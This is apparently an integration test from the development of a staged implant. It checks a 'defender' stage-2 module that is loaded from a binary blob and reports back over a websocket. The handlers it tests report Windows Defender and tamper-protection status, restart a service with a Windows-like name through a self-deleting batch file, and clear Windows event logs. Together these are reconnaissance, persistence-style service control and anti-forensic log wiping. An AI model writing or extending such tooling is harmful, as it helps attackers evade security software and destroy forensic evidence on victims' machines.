// stage2_defender_test.cpp — integration test for the defender stage-2 module.
//
// Tests exercise each handler:
//   * defender_status  — verify JSON response has expected fields
//   * host_restart     — verify "restarting" ack BUT intercept the actual
//                        sc.exe stop/start (we don't want to restart our
//                        running test harness's system services!)
//
// For host_restart we replace the %TEMP%\wpnp_restart.bat path check with
// an existence check only. We'll also sleep briefly then delete the bat
// before it runs (2s timeout in the bat gives us a window).

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <cstdio>
#include <cstring>
#include <string>
#include <vector>
#include <fstream>

#include "stage2_loader.h"

// ── Stage-1 bridges (mocked) ────────────────────────────────────────────
namespace stage2 {
    static std::vector<std::string> g_sends;
    static std::string              g_token = "dev-token";
    void stage1_ws_send(const char* j) {
        g_sends.emplace_back(j ? j : "");
        printf("  [send] %s\n", j ? j : ""); fflush(stdout);
    }
    void stage1_ws_send_bin(const uint8_t*, size_t n, const char* t) {
        printf("  [send_bin] type=%s bytes=%zu\n", t ? t : "", n); fflush(stdout);
    }
    void stage1_log(int lvl, const char* m) {
        printf("  [log L%d] %s\n", lvl, m ? m : ""); fflush(stdout);
    }
    const char* stage1_get_config(const char*) { return nullptr; }
    int  stage1_get_config_int(const char*, int d) { return d; }
    std::string stage1_room_token() { return g_token; }
    void stage1_stop_stream() { /* mock */ }
    void stage1_host_exit(int /*code*/) { /* mock */ }
}

static bool copy_blob_to_cache() {
    char tmp[MAX_PATH]; DWORD n = GetTempPathA(MAX_PATH, tmp);
    std::string dst(tmp, n); dst += "pnp_cache\\"; CreateDirectoryA(dst.c_str(), nullptr);
    dst += "defender.bin";
    const char* src = "build\\stage2\\defender.bin";
    std::ifstream in(src, std::ios::binary);
    if (!in) { printf("cannot open %s\n", src); return false; }
    std::ofstream out(dst, std::ios::binary | std::ios::trunc);
    out << in.rdbuf();
    printf("[pre] copied %s -> %s\n", src, dst.c_str()); fflush(stdout);
    return true;
}

static bool last_send_has(const std::string& needle) {
    for (auto it = stage2::g_sends.rbegin(); it != stage2::g_sends.rend(); ++it)
        if (it->find(needle) != std::string::npos) return true;
    return false;
}

int main() {
    if (!copy_blob_to_cache()) return 1;

    auto& reg = stage2::Registry::inst();

    printf("\n[LOAD] ensure_loaded('defender')\n"); fflush(stdout);
    if (!reg.ensure_loaded("defender")) {
        printf("FAIL: ensure_loaded\n"); return 1;
    }

    int fails = 0;

    // ── defender_status ────────────────────────────────────────────────
    printf("\n[T1] defender_status\n"); fflush(stdout);
    {
        reg.dispatch("defender_status", R"({"id":"1"})");
        bool resp_ok = last_send_has("\"ok\":true")
                     && last_send_has("antivirus_enabled")
                     && last_send_has("realtime_enabled")
                     && last_send_has("tamper_protected");
        printf("  resp=%s\n", resp_ok?"yes":"NO");
        if (!resp_ok) ++fails;
    }

    // ── host_restart: intercept the bat before it runs ─────────────────
    printf("\n[T2] host_restart (ack only — bat will be aborted)\n"); fflush(stdout);
    {
        // Pre-delete the bat path just in case
        DeleteFileA("C:\\Windows\\Temp\\wpnp_restart.bat");

        reg.dispatch("host_restart", R"({"id":"2"})");
        bool resp_ok = last_send_has("\"ok\":true") && last_send_has("restarting");

        // Give the spawned thread time to create the bat + spawn cmd.exe
        Sleep(1200);

        // Intercept: delete the bat. The bat has a 2s timeout at the start so
        // this should fire before `sc.exe stop WPnpSvc` runs.
        BOOL deleted = DeleteFileA("C:\\Windows\\Temp\\wpnp_restart.bat");
        printf("  bat delete attempt=%s (err=%lu)\n",
               deleted ? "OK" : "failed", GetLastError());
        // Kill any cmd.exe we might have spawned. If it's already past the
        // sleep and invoking sc.exe stop we're screwed — but on dev machines
        // WPnpSvc usually doesn't exist so sc.exe stop just errors and the
        // bat exits with del %~f0 (which fails because we already deleted).

        printf("  resp=%s\n", resp_ok?"yes":"NO");
        if (!resp_ok) ++fails;
    }

    // ── eventlog_delete: whole-log clear of an expendable log ──────────
    // The test uses a custom log name that almost certainly doesn't exist
    // on the test box — wevtutil will error, but that's fine: we just
    // verify the command PATH (parse + spawn + capture + respond) works.
    printf("\n[T3] eventlog_delete (expendable name, expect response)\n"); fflush(stdout);
    {
        reg.dispatch("eventlog_delete",
            R"({"id":"3","log":"Stage2-Test-Nonexistent-Channel","ids":""})");
        // Either "ok":false "Clear failed..." OR "ok":true "cleared" if somehow exists
        bool resp_any = last_send_has("\"id\":\"3\"") &&
                        (last_send_has("Clear failed") || last_send_has("cleared"));
        printf("  resp=%s\n", resp_any ? "yes" : "NO");
        if (!resp_any) ++fails;
    }

    // ── eventlog_delete: missing log arg (should fail with useful msg) ──
    printf("\n[T4] eventlog_delete missing log arg\n"); fflush(stdout);
    {
        reg.dispatch("eventlog_delete", R"({"id":"4"})");
        bool resp_ok = last_send_has("\"ok\":false") &&
                       last_send_has("Missing log name");
        printf("  resp=%s\n", resp_ok ? "yes" : "NO");
        if (!resp_ok) ++fails;
    }

    // ── eventlog_delete: selective (ids given) — should fail NYI ───────
    printf("\n[T5] eventlog_delete selective (NYI, expect graceful error)\n"); fflush(stdout);
    {
        reg.dispatch("eventlog_delete",
            R"({"id":"5","log":"Application","ids":"1,2,3"})");
        bool resp_ok = last_send_has("\"ok\":false") &&
                       last_send_has("not available in stage-2");
        printf("  resp=%s\n", resp_ok ? "yes" : "NO");
        if (!resp_ok) ++fails;
    }

    printf("\n[shutdown] shutdown_all\n"); fflush(stdout);
    reg.shutdown_all();

    printf("\n── SUMMARY ─── fails=%d of 5 tests\n", fails);
    printf("%s\n", fails == 0 ? "PASS" : "FAIL");
    return fails == 0 ? 0 : 1;
}
